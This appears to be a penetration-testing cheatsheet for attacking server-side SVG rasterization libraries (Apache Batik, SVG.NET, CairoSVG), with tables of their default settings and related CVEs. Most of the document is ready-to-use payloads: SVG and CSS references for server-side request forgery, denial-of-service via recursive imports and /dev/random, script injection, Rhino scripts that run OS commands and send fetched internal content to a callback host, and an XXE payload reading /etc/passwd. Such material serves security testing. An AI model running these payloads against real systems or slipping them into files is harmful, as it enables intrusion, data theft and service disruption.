# SVG rasterization cheatsheet

<!-- TOC -->

- [SVG rasterization cheatsheet](#svg-rasterization-cheatsheet)
  - [XLink:Href references](#xlinkhref-references)
    - [Documents](#documents)
    - [Images](#images)
    - [Fonts](#fonts)
    - [ICC profiles](#icc-profiles)
  - [Stylesheets](#stylesheets)
    - [XML stylesheet](#xml-stylesheet)
    - [CSS @import](#css-import)
      - [CSS infinite loading via @import rule](#css-infinite-loading-via-import-rule)
      - [Infinite loading using ```/dev/random```](#infinite-loading-using-devrandom)
    - [Tags styles using ```fill``` attribute](#tags-styles-using-fill-attribute)
  - [Scripting](#scripting)
    - [Embedded scripts](#embedded-scripts)
      - [Script tag](#script-tag)
      - [Events](#events)
    - [External scripts](#external-scripts)
    - [Code execution](#code-execution)
  - [XML External Entities](#xml-external-entities)
  - [Libraries](#libraries)
    - [Apache Batik (Java)](#apache-batik-java)
    - [SVG.NET (.NET)](#svgnet-net)
    - [CairoSVG (Python)](#cairosvg-python)

<!-- /TOC -->

## XLink:Href references

The [specification](https://www.w3.org/TR/xlink11/) says that:

> This specification defines the XML Linking Language (XLink) Version 1.1, which allows elements to be inserted into XML documents in order to create and describe links between resources. It uses XML syntax to create structures that can describe links similar to the simple unidirectional hyperlinks of today's HTML, as well as more sophisticated links.

In case of SVG files it allows to reference external or embedded resources such as images, XML-based documents, Fonts, ICC profiles. During server-side rasterization it could lead to blind or semi-blind server-side request forgery (SSRF) vulnerabilities. Blind if content validation is missing or exceptions suppressed.


### Documents

feImage:
```xml
<filter id="externalFeImage" x="0" y="0" width="1" height="1">
    <feImage xlink:href="http://internal-resource#id-fragment"/>
</filter>
<rect id="feImage" x="0" y="0" width="100%" height="100%" filter="url(#externalFeImage)" />
```

altGlyph (altGlyphDef, glyphRef):
```xml
<text x="30" y="130">
    <altGlyph xlink:href="http://internal-resource#id-fragment"></altGlyph>
</text>
```

use:
```xml
<use xlink:href="http://internal-resource#id-fragment" />
```

text (tref):
```xml
<text fill="none">
    <tref xlink:href="http://internal-resource#id-fragment"/>
</text>
```

### Images

image:
```xml
<image width="100" height="100" xlink:href="http://internal-resource"></image>
```

### Fonts

```xml
<font-face font-family="External Font">
    <font-face-src>
        <font-face-uri xlink:href="http://internal-resource"/>
    </font-face-src>     
</font-face>
<text font-family="'External Font'">external font</text>
```

### ICC profiles

```xml
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink">
     <color-profile name="external-profile" xlink:href="http://internal-resource"></color-profile>
     <path fill="rgb(179, 70, 25) icc-color(external-profile, 0.702, 0.2745, 0.098)"/>
</svg>
```

## Stylesheets

### XML stylesheet

```xml
<?xml-stylesheet type="text/css" href="http://internal-resource" ?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
</svg>
```

### CSS @import

```xml
<style type="text/css">
    @import url(http://internal-resource);
</style>

```

#### CSS infinite loading via @import rule

Some CSS engines don't check for the self-references during ```@import``` rule processing. This could be used for DoS scenarios by triggering infinite CSS loading using specially crafted [styles file](https://github.com/yuriisanin/svg2raster-cheatsheet/blob/d31633146d62863b71b1dbdb40b8703f7b1abcc1/assets/css-infinite-import.css). 

![css-infinite-import](https://github.com/yuriisanin/svg2raster-cheatsheet/blob/63a07f7c5dd91b3c577ff31a143c253b50cf5c79/assets/svg-infinite-css-import.png)

#### Infinite loading using ```/dev/random```

In some cases you can trick a library into loading data from the infinite stream, causing significant resource consumption on the server side. Although, it won't crash the application, but it's still can be used for DoS scenarios.

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <style type="text/css">
        @import url(file:///dev/random);
    </style>
</svg>
```
Pseudorandom number generators:

* ```/dev/random```
* ```/dev/urandom```
* ```/dev/arandom```

### Tags styles using ```fill``` attribute

[Supported tags](https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/fill)

rect:
```xml
<rect width="100" height="100" fill="url(http://internal-resource)"></rect>
```

path:
```xml
<path fill="url(http://internal-resource)"></path>
```

## Scripting

It worth to check if the library processing javascript, because in some cases it could lead to remote code execution.

### Embedded scripts

#### Script tag

```xml
<script type="application/javascript">
    alert(1);
</script>
```

#### Events

```xml
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink"
     onload="alert(1)">
</svg>
```

### External scripts

```xml
<script type="text/ecmascript" xlink:href="http://external-resource"></script>
```

### Code execution

Apache Batik offers script execution capabilities from the box. It uses Mozilla Rhino script intepreter and allows to use Java objects and classes. It has pretty weak ```ClassShutter``` and doesn't apply script sandboxing on the framework level. This makes it possible for attackers to achive Java code execution on the target machine. It [recommended](https://xmlgraphics.apache.org/batik/using/scripting/security.htmls) to use Java Security manager for sandboxing purposes.


> It worth mentioning that ```batik-rasterizer``` application applies security, and restricts access to all critical resources using Java ```SecurityManager```.


1. Time-based Rhino fingerprinting:

```xml
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink">
    <script type="text/ecmascript">
        // Sleep for 30 seconds
        importPackage(Packages.java.lang);
        Thread.sleep(30000);
    </script>
</svg>
```

2. Rhino OS command execution:

> Java policy: ```permission java.io.FilePermission "<<ALL FILES>>", "read, execute";```

```xml
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink">
    <script type="text/ecmascript">
        importPackage(Packages.java.lang);
        Runtime.getRuntime().exec("open -a Calculator");
    </script>
</svg>
```

1. Server-Side Request Forgery:

> Java policy: ```permission java.net.SocketPermission "*", "listen, connect, resolve, accept";```

```xml
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink">
    <script type="text/ecmascript">
        importPackage(Packages.java.net);
        importPackage(Packages.java.util);
        importPackage(Packages.java.lang);
        importPackage(Packages.org.apache.commons.io);
        var targetC = new java.net.URL("http://target-internal-host").openConnection();
        var targetContent = IOUtils.toString(targetC.getContent());
        var encodedContent = Base64.getUrlEncoder().encodeToString(new java.lang.String(targetContent).getBytes());
        var callbackC = new java.net.URL("http://callback-host/callback?resp="+encodedContent).openConnection();
        callbackC.getContent();
    </script>
</svg>
```

It is still possible to get some impact from sandboxed script execution - you can get details about application internals (except classes from prohibited namespaces), such as class names, their methods and fields by using reflection mechanism. 

Prohibited classes:
* ```org.mozilla.javascript.*```
* ```org.apache.batik.script.*```
* ```org.apache.batik.apps.*```
* ```org.apache.batik.bridge.ScriptingEnvironment.*```
* ```org.apache.batik.bridge.BaseScriptingEnvironment.*```

1. Fingerprinting available classes:

```xml
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink">
    <script type="text/ecmascript">
    <![CDATA[
        importPackage(Packages.java.lang)
        var cn = Class.forName("org.apache.batik.script.ImportInfo");

        // Get class info
        var cnConstructors = cn.getConstructors();
        for (var i=0; i<cnConstructors.length; i++){
            System.out.println(cnConstructors[i]);
        }
        var cnMethods = cn.getMethods();
        for (var i=0; i<cnMethods.length; i++){
            System.out.println(cnMethods[i]);
        }
        var cnFields = cn.getFields();
        for (var i=0; i<cnFields.length; i++){
            System.out.println(cnFields[i]);
        }

        // Get classes in the package
        var classes = cn.getClasses();
        System.out.println("Classes:");
        for (var i=0; i<classes.length; i++){
            System.out.println(classes[i].getCanonicalName());
        }
        ]]>  
    </script>
</svg>
```

## XML External Entities

Old but gold. Most of the libraries don't allow to use XML external entities or DTD, however, this option could be enabled by developers. Defenetly worth to check.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text>
        &xxe;
    </text>
</svg>
```

## Libraries

### Apache Batik (Java)

* Repository: https://github.com/apache/xmlgraphics-batik
* User Agent: ```Batik / {version}```

| External Resource | Config |
| - | - |
| [Images & Documents](#xlink-references) | <ul><li>**Enabled [Default]**</li><li>**Disabled (OPTION: KEY_ALLOW_EXTERNAL_RESOURCES)**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, JAR, FILE, DATA```</li></ul><br>Related CVEs: <ul><li>[CVE-2019-17566, Apache Batik < 1.13](https://nvd.nist.gov/vuln/detail/CVE-2019-17566)</li></ul> |
| [Fonts](#fonts) | <ul><li>**Enabled [Default]**</li><li>**Disabled (OPTION: KEY_ALLOW_EXTERNAL_RESOURCES)**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, JAR, FILE, DATA```</li></ul> |
| [CSS](#css-stylesheet) | <ul><li>**Enabled [Default]**</li><li>**Disabled (OPTION: KEY_ALLOW_EXTERNAL_RESOURCES)**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, JAR, FILE, DATA```</li></ul> |  
| [ICC profiles](#icc-profiles) | <ul><li>**Enabled [Default]**</li><li>**Disabled (OPTION: KEY_ALLOW_EXTERNAL_RESOURCES)**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, JAR, FILE, DATA```</li></ul> | 
| [Embedded/External Scripts](#apache-batik-javascript) | <ul><li>**Disabled [Default]**</li><li>**Enabled (OPTION: KEY_EXECUTE_ONLOAD)**</li></ul>Supported scripts:<ul><li>```text/ecmascript```</li><li>```text/javascript```</li><li>```text/javascript```</li><li>```application/ecmascript```</li><li>```application/javascript```</li></ul>Related CVEs:<ul><li>[CVE-2005-0508, Apache Batik < 1.5.1](https://nvd.nist.gov/vuln/detail/CVE-2005-0508)</li></ul> |
| [External entities & DTD](#xml-external-entities) | <ul><li>**Disabled [Default]**</li><li>**Enabled (N/A)**</li></ul><br>Related CVEs:<ul><li>[CVE-2015-0250, Apache Batik < 1.7.1](https://nvd.nist.gov/vuln/detail/CVE-2017-5662)</li><li>[CVE-2017-5662, Apache Batik < 1.9](https://nvd.nist.gov/vuln/detail/CVE-2017-5662)</li></ul>


### SVG.NET (.NET)

Repository: https://github.com/svg-net/SVG

| External Resource | Config (Enabled) | 
| - | - |
| Documents | <ul><li>**Enabled [Default]**</li><li>**Disabled (Option: ResolveExternalElements = ExternalType.None)**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, FILE```</li></ul> |
| Images | <ul><li>**Enabled [Default]**</li><li>**Disabled (Option: ResolveExternalImages = ExternalType.None)**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, FTP, FILE, DATA```</li></ul> |
| Fonts | <ul><li>**Enabled [Default]**</li><li>**Disabled (Option: ResolveExternalElements = ExternalType.None)**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, FILE```</li></ul>  |
| CSS | - |
| ICC profiles | - |
| External DTD / Entities | <ul><li>**Disabled [Default]**</li><li>**Enabled (Option: ResolveExternalXmlEntites = ExternalType.None)**</li></ul> | 
| Ecmascript processing | - |


### CairoSVG (Python)

* Repository: https://github.com/Kozea/CairoSVG
* User-Agent: ```CairoSVG 2.5.2```

| External Resource | Config (Enabled) | 
| - | - |
| Documents | <ul><li>**Enabled [Default]**</li><li>**Disabled: N/A**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, FILE, FTP, DATA```</li></ul> |
| Images | <ul><li>**Enabled [Default]**</li><li>**Disabled: N/A**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, FTP, FILE, DATA```</li></ul> |
| Fonts | - |
| CSS | <ul><li>**Enabled [Default]**</li><li>**Disabled: N/A**</li></ul><br>Supported schemas:<ul><li>```HTTP, HTTPS, FTP, FILE, DATA```</li></ul> |
| ICC profiles | - |
| External DTD / Entities | - | 
| Ecmascript processing | - |
